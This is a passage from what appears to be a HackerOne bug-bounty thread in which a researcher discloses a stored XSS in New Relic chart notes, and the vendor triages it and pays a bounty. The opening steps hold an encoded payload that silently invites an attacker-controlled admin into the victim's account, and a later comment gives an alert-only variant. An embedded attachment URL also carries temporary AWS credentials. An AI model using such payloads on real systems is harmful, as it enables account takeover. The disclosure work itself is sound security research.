c%5d%3d%2f%61%63%63%6f%75%6e%74%73%2f%32%32%36%30%35%39%39%2f%63%75%73%74%6f%6d%5f%64%61%73%68%62%6f%61%72%64%73%2f%70%61%67%65%73%2f%31%34%37%37%31%3f%74%77%25%35%42%64%75%72%25%35%44%3d%6c%61%73%74%5f%33%30%5f%6d%69%6e%75%74%65%73\n```\n\n5) Change the original request's `note_item%5Bdata_url%5D` parameter value to the above step's result:\n```\nPOST /accounts/2260599/notes?agent_id=123 HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nutf8=%E2%9C%93\u0026authenticity_token=Eo81Lfdy1ev9QT3ab4LuNLMxY%2FRfWdGocbxiDwBLW8Y%3D\u0026app_name=undefined\u0026note_item%5Bswf%5D=\u0026note_item%5Bbegin_time%5D=2019-03-13T15%3A14%3A14-07%3A00\u0026note_item%5Bend_time%5D=2019-03-13T15%3A44%3A14-07%3A00\u0026note_item%5Btitle%5D=test\u0026note_item%5Bdata_url%5D=%2f%63%68%61%72%74%5f%64%61%74%61%2f%6d%65%74%72%69%63%5f%63%68%61%72%74%73%2f%73%69%6e%67%6c%65%5f%6d%65%74%72%69%63%2e%6a%73%6f%6e%3f%61%63%63%6f%75%6e%74%5f%69%64%3d%32%32%36%30%35%39%39%26%61%64%64%5f%74%6f%5f%64%61%73%68%62%6f%61%72%64%3d%66%61%6c%73%65%26%61%67%65%6e%74%3d%32%38%37%37%38%35%36%32%35%26%63%68%61%72%74%5f%74%79%70%65%3d%53%74%61%63%6b%65%64%41%72%65%61%32%44%26%63%75%72%72%65%6e%74%5f%70%72%6f%64%75%63%74%3d%61%70%6d%5f%70%72%6f%64%75%63%74%26%66%6f%72%6d%61%74%5f%66%6e%3d%73%6d%61%72%74%5f%72%6f%75%6e%64%26%68%69%64%65%5f%6c%65%67%65%6e%64%3d%66%61%6c%73%65%26%6c%69%6d%69%74%3d%31%30%30%26%6e%61%6d%65%3d%41%67%65%6e%74%25%32%46%4d%65%74%72%69%63%73%52%65%70%6f%72%74%65%64%25%32%46%63%6f%75%6e%74%26%6e%6f%5f%63%6c%69%63%6b%3d%74%72%75%65%26%6e%6f%5f%6c%69%6e%6b%73%3d%74%72%75%65%26%6e%75%6d%62%65%72%5f%73%75%66%66%69%78%3d%25%32%37%25%37%36%25%36%31%25%37%32%25%32%30%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%33%64%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%33%25%36%66%25%36%66%25%36%62%25%36%39%25%36%35%25%32%65%25%36%64%25%36%31%25%37%34%25%36%33%25%36%38%25%32%38%25%32%66%25%36%31%25%36%61%25%37%33%25%35%66%25%36%37%25%37%32%25%36%66%25%37%35%25%37%30%25%35%66%25%36%39%25%36%34%25%33%64%25%32%38%25%35%63%25%36%34%25%32%62%25%32%39%25%32%66%25%32%39%25%35%62%25%33%31%25%35%64%25%33%62%25%37%36%25%36%31%25%37%32%25%32%30%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%33%64%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%39%25%36%35%25%37%37%25%33%61%25%37%62%25%37%35%25%37%33%25%36%35%25%37%32%25%33%61%25%37%62%25%36%36%25%37%35%25%36%63%25%36%63%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%33%61%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%32%25%32%63%25%36%35%25%36%64%25%36%31%25%36%39%25%36%63%25%33%61%25%32%32%25%36%31%25%37%34%25%37%34%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%30%25%37%33%25%36%62%25%36%31%25%37%36%25%36%31%25%36%65%25%37%33%25%32%65%25%37%32%25%37%35%25%32%32%25%37%64%25%32%63%25%36%63%25%36%35%25%37%36%25%36%35%25%36%63%25%33%61%25%32%32%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%32%25%37%64%25%37%64%25%33%62%25%32%34%25%32%65%25%36%31%25%36%61%25%36%31%25%37%38%25%32%38%25%37%62%25%37%35%25%37%32%25%36%63%25%33%61%25%36%30%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%32%25%37%30%25%36%64%25%32%65%25%36%65%25%36%35%25%37%37%25%37%32%25%36%35%25%36%63%25%36%39%25%36%33%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%35%66%25%36%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%66%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%37%33%25%32%66%25%32%34%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%37%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%36%65%25%36%35%25%37%37%25%36%30%25%32%63%25%36%34%25%36%31%25%37%34%25%36%31%25%33%61%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%32%39%25%32%63%25%36%38%25%36%35%25%36%31%25%36%34%25%36%35%25%37%32%25%37%33%25%33%61%25%37%62%25%32%32%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%37%34%25%37%39%25%37%30%25%36%35%25%32%32%25%33%61%25%32%30%25%32%32%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%36%61%25%37%33%25%36%66%25%36%65%25%32%32%25%37%64%25%32%63%25%37%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%32%25%37%30%25%36%66%25%37%33%25%37%34%25%32%32%25%32%63%25%36%31%25%37%33%25%37%39%25%36%65%25%36%33%25%33%61%25%36%36%25%36%31%25%36%63%25%37%33%25%36%35%25%37%64%25%32%39%25%33%62%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%30%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%30%25%37%37%25%36%31%25%37%33%25%32%30%25%36%39%25%36%65%25%37%36%25%36%39%25%37%34%25%36%35%25%36%34%25%32%32%25%32%39%25%33%62%25%32%37%2b%3c%69%6d%67%2f%3e%26%72%65%6e%64%65%72%5f%74%6f%3d%34%35%30%39%39%26%73%68%6f%77%5f%65%76%65%6e%74%73%3d%74%72%75%65%26%73%75%62%74%69%74%6c%65%3d%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%36%35%25%37%32%25%36%39%25%36%35%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%34%25%36%31%25%37%34%25%36%31%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%65%25%36%31%25%36%64%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%32%25%37%64%25%35%64%25%37%64%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%34%31%25%37%38%25%36%39%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%37%39%25%37%30%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%31%25%37%34%25%36%35%25%36%37%25%36%66%25%37%32%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%31%25%37%34%25%36%35%25%36%37%25%36%66%25%37%32%25%36%39%25%36%35%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%63%25%37%33%25%37%36%25%36%37%25%32%30%25%36%66%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%33%64%25%32%37%25%32%63%25%32%37%25%33%65%25%33%63%25%32%66%25%37%33%25%37%36%25%36%37%25%33%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%63%25%36%31%25%36%32%25%36%35%25%36%63%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%35%25%37%33%25%36%35%25%34%38%25%35%34%25%34%64%25%34%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%37%64%25%37%64%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%63%25%36%66%25%37%34%25%34%66%25%37%30%25%37%34%25%36%39%25%36%66%25%36%65%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%38%25%34%31%25%37%38%25%36%39%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%37%64%25%37%64%25%33%63%25%32%66%25%37%33%25%37%30%25%36%31%25%36%65%25%33%65%26%74%69%74%6c%65%3d%74%65%73%74%26%74%77%25%35%42%64%75%72%25%35%44%3d%6c%61%73%74%5f%33%30%5f%6d%69%6e%75%74%65%73%26%74%77%25%35%42%65%6e%64%25%35%44%3d%31%35%35%32%35%31%37%30%35%34%26%76%61%6c%75%65%3d%63%61%6c%6c%5f%63%6f%75%6e%74%26%6e%6f%5f%63%6c%69%63%6b%3d%31%26%6e%6f%5f%6c%69%6e%6b%73%3d%31%26%6e%6f%74%65%5f%69%74%65%6d%5b%63%6f%6e%74%65%78%74%5f%75%72%6c%5d%3d%2f%61%63%63%6f%75%6e%74%73%2f%32%32%36%30%35%39%39%2f%63%75%73%74%6f%6d%5f%64%61%73%68%62%6f%61%72%64%73%2f%70%61%67%65%73%2f%31%34%37%37%31%3f%74%77%25%35%42%64%75%72%25%35%44%3d%6c%61%73%74%5f%33%30%5f%6d%69%6e%75%74%65%73\u0026note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14771%3Ftw%255Bdur%255D%3Dlast_30_minutes\u0026note_item%5Bnote_text%5D=\u0026note_action=create\u0026note_id=6140\u0026action_after=save_and_close\n```\n\nAlso I changed the `agent_id` get parameter to some number value (123), it is set to undefined at original request for unknown reason. It doesn't matter but the will be error in response otherwise (having no influence to the attack success though).\n\n6) Submit the changed request. The response is:\n```json\n{\"id\":6144,\"action\":\"save_and_close\",\"note_action\":\"create\",\"title\":\"undefined: test\"}\n```\n\n7) Navigate to https://rpm.newrelic.com/accounts/2260599/notes/6144, wait a little and a payload will fire.\n\nFull video-PoC is below\n\n{F441104}\n\n","automated_response":false,"created_at":"2019-03-13T23:18:44.520Z","updated_at":"2019-03-13T23:18:44.520Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":441104,"filename":"newrelic.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/441/104/e788d707566b5c8a129c2c7c0b25a3dd0bb39f49/newrelic.mp4?response-content-disposition=attachment%3B%20filename%3D%22newrelic.mp4%22%3B%20filename%2A%3DUTF-8%27%27newrelic.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=80e7cc92cbf21d0a9d339858df05f28bc2b00f46e727b5b6d2a186002868b881"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4319781,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please use Firefox, the payload for other browsers may differ.\n\nP.S.: my payload uses search in cookies to find victim's account. If you see nothing instead of popped up alert box, please check the JS-console for error like\n```\nTypeError: document.cookie.match(...) is null\n```\n\nIn this case, you have no `ajs_group_id` cookie for some reason and I can change the payload to use another way to detect your account ID.","automated_response":false,"created_at":"2019-03-13T23:41:49.040Z","updated_at":"2019-03-13T23:46:12.566Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4323437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hope the guide above helped you to reproduce the issue. \nIf not, please let me know and I will share a publicly-available infected note with you (I haven't done it yet because I am afraid that this note can be viewed by some other New Relic user).","automated_response":false,"created_at":"2019-03-14T15:25:02.903Z","updated_at":"2019-03-14T15:25:02.903Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325137,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nThanks for the very helpful video. I'm still having trouble reproducing this with the payload provided, so I have an idea. Since I understand how the XSS can be used to invite an admin to your account, can you provide me with a simpler payload that *only* displays an alert box? \n\nI only need to demonstrate that javascript can indeed be executed. If I can demonstrate that, then it implies that it can be also be used to invite an admin.\n\nHopefully if you can provide me with an alert box payload, I can reproduce and pay you a reward :)","automated_response":false,"created_at":"2019-03-14T19:17:31.916Z","updated_at":"2019-03-14T19:17:31.916Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325138,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2019-03-14T19:17:39.468Z","updated_at":"2019-03-14T19:17:39.468Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325192,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey @dday,\n\nOf course, I had to offer this myself.\nhttps://rpm.newrelic.com/public/notes/aHY4tIF1Hlz\n\nOpen this link using Firefox and the alert box will pop up.","automated_response":false,"created_at":"2019-03-14T19:32:48.387Z","updated_at":"2019-03-14T19:32:48.387Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325309,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans,\n\nBefore I click this, you can confirm that this is only displaying an alert box, and not actually inviting a user to the account, correct?","automated_response":false,"created_at":"2019-03-14T20:00:47.206Z","updated_at":"2019-03-14T20:00:47.206Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325313,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I confirm.","automated_response":false,"created_at":"2019-03-14T20:01:43.811Z","updated_at":"2019-03-14T20:01:43.811Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325374,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Awesome find @skavans !\n\nThanks very much for your very dilligent and helpful videos and your fast responses. This is one of the better reports that we've gotten and you've clearly demonstrated how this XSS can be used to compromise a victims account. As such, I'm going to award you a bonus.\n\nOnce again, thanks for helping to keep New Relic safe, and I'll start looking into your new reports :)","automated_response":false,"created_at":"2019-03-14T20:15:45.982Z","updated_at":"2019-03-14T20:15:45.982Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325380,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-03-14T20:16:40.831Z","updated_at":"2019-03-14T20:16:40.831Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4325908,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@skavans ,\n\nAdditionally - can you please provide the payload itself that you used to do the alert box? I'd like to include the payload code in my internal ticket. ","automated_response":false,"created_at":"2019-03-14T20:40:52.509Z","updated_at":"2019-03-14T20:40:52.509Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for bounty and bonus @dday!\n\nThis is the request I made to infect a note with malicious JS-code popping up the alert box:\n```http\nPOST /accounts/2260599/notes?agent_id=123 HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nutf8=%E2%9C%93\u0026authenticity_token=Eo81Lfdy1ev9QT3ab4LuNLMxY%2FRfWdGocbxiDwBLW8Y%3D\u0026app_name=undefined\u0026note_item%5Bswf%5D=\u0026note_item%5Bbegin_time%5D=2019-03-13T15%3A14%3A14-07%3A00\u0026note_item%5Bend_time%5D=2019-03-13T15%3A44%3A14-07%3A00\u0026note_item%5Btitle%5D=test\u0026note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DStackedArea2D%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DAgent%252FMetricsReported%252Fcount%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3D%2527alert%2528%2529%2527%252B%253Cimg%252F%253E%26render_to%3D45099%26show_events%3Dtrue%26subtitle%3D%2526%2571%2575%256f%2574%253b%257d%252c%2526%2571%2575%256f%2574%253b%2573%2565%2572%2569%2565%2573%2526%2571%2575%256f%2574%253b%253a%255b%257b%2526%2571%2575%256f%2574%253b%2564%2561%2574%2561%2526%2571%2575%256f%2574%253b%253a%255b%257b%2526%2571%2575%256f%2574%253b%256e%2561%256d%2565%2526%2571%2575%256f%2574%253b%253a%2526%2571%2575%256f%2574%253b%2526%2571%2575%256f%2574%253b%252c%2526%2571%2575%256f%2574%253b%2579%2526%2571%2575%256f%2574%253b%253a%2532%257d%255d%257d%255d%252c%2526%2571%2575%256f%2574%253b%2579%2541%2578%2569%2573%2526%2571%2575%256f%2574%253b%253a%255b%257b%2526%2571%2575%256f%2574%253b%2574%2579%2570%2565%2526%2571%2575%256f%2574%253b%253a%2526%2571%2575%256f%2574%253b%2563%2561%2574%2565%2567%256f%2572%2579%2526%2571%2575%256f%2574%253b%252c%2526%2571%2575%256f%2574%253b%2563%2561%2574%2565%2567%256f%2572%2569%2565%2573%2526%2571%2575%256f%2574%253b%253a%255b%2526%2571%2575%256f%2574%253b%253c%2573%2576%2567%2520%256f%256e%256c%256f%2561%2564%253d%2527%252c%2527%253e%253c%252f%2573%2576%2567%253e%2526%2571%2575%256f%2574%253b%255d%252c%2526%2571%2575%256f%2574%253b%256c%2561%2562%2565%256c%2573%2526%2571%2575%256f%2574%253b%253a%257b%2526%2571%2575%256f%2574%253b%2565%256e%2561%2562%256c%2565%2564%2526%2571%2575%256f%2574%253b%253a%2574%2572%2575%2565%252c%2526%2571%2575%256f%2574%253b%2575%2573%2565%2548%2554%254d%254c%2526%2571%2575%256f%2574%253b%253a%2574%2572%2575%2565%257d%257d%255d%252c%2526%2571%2575%256f%2574%253b%2570%256c%256f%2574%254f%2570%2574%2569%256f%256e%2573%2526%2571%2575%256f%2574%253b%253a%257b%257d%252c%2526%2571%2575%256f%2574%253b%2578%2541%2578%2569%2573%2526%2571%2575%256f%2574%253b%253a%257b%257d%257d%253c%252f%2573%2570%2561%256e%253e%26title%3Dtest%26tw%255Bdur%255D%3Dlast_30_minutes%26tw%255Bend%255D%3D1552517054%26value%3Dcall_count%26no_click%3D1%26no_links%3D1%26note_item%5Bcontext_url%5D%3D%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14771%3Ftw%255Bdur%255D%3Dlast_30_minutes\u0026note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14771%3Ftw%255Bdur%255D%3Dlast_30_minutes\u0026note_item%5Bnote_text%5D=\u0026note_action=create\u0026note_id=6140\u0026action_after=save_and_close\n```\n\nPlease note at your internal report that there should be 2 fixes made:\n1. Check the `data_url` using regular expressions or white list (to not allow attacker to submit different internal URL that can contain malicious JSON)\n2. Do not urldecode the resulting response of the GET-request made to `data_url`, because it breaks the resulting JSON and gives attacker the opportunity to break its fields and inject malicious payload into Highcharts chart config.\n\nAfter the fix is done, please reach me and I will retest this carefully.","automated_response":false,"created_at":"2019-03-14T21:46:01.039Z","updated_at":"2019-03-14T21:46:15.329Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dday It would be much appreciated, if you can write a comment at my profile :)","automated_response":false,"created_at":"2019-03-14T21:55:37.998Z","updated_at":"2019-03-14T21:55:37.998Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326246,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What do you mean write a comment at your 